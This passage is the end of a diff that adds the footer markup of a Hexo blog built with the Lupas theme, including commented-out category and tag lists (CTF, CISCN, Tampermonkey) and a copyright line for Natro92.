+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
